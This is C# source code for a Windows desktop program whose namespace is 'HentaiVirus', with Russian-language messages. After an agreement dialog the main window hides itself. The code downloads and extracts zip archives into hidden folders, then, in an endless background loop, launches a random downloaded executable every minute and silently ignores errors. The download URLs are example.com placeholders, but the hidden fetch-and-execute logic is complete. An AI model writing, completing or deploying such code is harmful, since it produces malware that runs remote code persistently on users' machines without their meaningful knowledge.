using System;
using System.Diagnostics;
using System.IO;
using System.Windows;
using HentaiVirus.Database;
using HentaiVirus.Core;
using Microsoft.Data.Sqlite;

namespace HentaiVirus
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void AcceptButton_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Соглашение принято. Запуск фоновых служб...", "Информация", MessageBoxButton.OK, MessageBoxImage.Information);
            
            var dbManager = new DatabaseManager();
            dbManager.InitializeDatabase();

            SeedDatabaseWithLinks();

            this.Hide();

            System.Threading.Tasks.Task.Run(async () => { await StartCoreEngineAsync(); });
        }

        private void SeedDatabaseWithLinks()
        {
            using var connection = new SqliteConnection("Data Source=games.db");
            connection.Open();
            
            var checkCmd = new SqliteCommand("SELECT COUNT(*) FROM Games", connection);
            long count = (long)checkCmd.ExecuteScalar()!;
            
            if (count == 0)
            {
                string[] testUrls = {
                    "https://example.com/game1.zip",
                    "https://example.com/game2.zip",
                    "https://example.com/game3.zip"
                };

                foreach (var url in testUrls)
                {
                    var insertCmd = new SqliteCommand(
                        "INSERT INTO Games (DownloadUrl, TargetDirectory, ExePath) VALUES (@url, '', '')", connection);
                    insertCmd.Parameters.AddWithValue("@url", url);
                    insertCmd.ExecuteNonQuery();
                }
            }
        }

        private async System.Threading.Tasks.Task StartCoreEngineAsync()
        {
            var dbManager = new DatabaseManager();
            var downloader = new Downloader();

            using (var connection = new SqliteConnection("Data Source=games.db"))
            {
                connection.Open();
                var selectCmd = new SqliteCommand("SELECT Id, DownloadUrl FROM Games WHERE IsDownloaded = 0", connection);
                
                using var reader = selectCmd.ExecuteReader();
                while (reader.Read())
                {
                    int id = reader.GetInt32(0);
                    string url = reader.GetString(1);
                    string gameName = $"Game_{id}";

                    try
                    {
                        string targetFolder = dbManager.GenerateHiddenPath(gameName);
                        
                        string exePath = await downloader.DownloadAndExtractAsync(url, targetFolder);

                        if (!string.IsNullOrEmpty(exePath))
                        {
                            using var updateConn = new SqliteConnection("Data Source=games.db");
                            updateConn.Open();
                            var updateCmd = new SqliteCommand(
                                "UPDATE Games SET TargetDirectory = @dir, ExePath = @exe, IsDownloaded = 1 WHERE Id = @id", updateConn);
                            updateCmd.Parameters.AddWithValue("@dir", targetFolder);
                            updateCmd.Parameters.AddWithValue("@exe", exePath);
                            updateCmd.Parameters.AddWithValue("@id", id);
                            updateCmd.ExecuteNonQuery();
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
            }

            while (true)
            {
                string exeToRun = string.Empty;

                using (var connection = new SqliteConnection("Data Source=games.db"))
                {
                    connection.Open();
                    var randomCmd = new SqliteCommand("SELECT ExePath FROM Games WHERE IsDownloaded = 1 ORDER BY RANDOM() LIMIT 1", connection);
                    exeToRun = randomCmd.ExecuteScalar()?.ToString() ?? string.Empty;
                }

                if (!string.IsNullOrEmpty(exeToRun) && File.Exists(exeToRun))
                {
                    try
                    {
                        Process process = Process.Start(exeToRun);
                        
                        process.WaitForExit();
                    }
                    catch
                    {
                        // Игнорируем ошибки запуска
                    }
                }

                await System.Threading.Tasks.Task.Delay(TimeSpan.FromMinutes(1));
            }
        }
    }
}